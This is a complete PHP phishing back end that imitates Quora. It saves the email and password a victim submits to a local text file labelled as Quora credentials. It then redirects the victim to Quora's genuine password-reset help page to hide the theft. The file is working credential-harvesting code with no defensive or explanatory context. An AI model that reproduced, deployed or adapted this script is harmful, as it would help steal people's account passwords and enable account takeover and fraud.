<?php

file_put_contents("usernames.txt", "Quora Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://help.quora.com/hc/en-us/articles/115004232866-How-do-I-change-or-reset-my-password-on-Quora-');
exit();
?>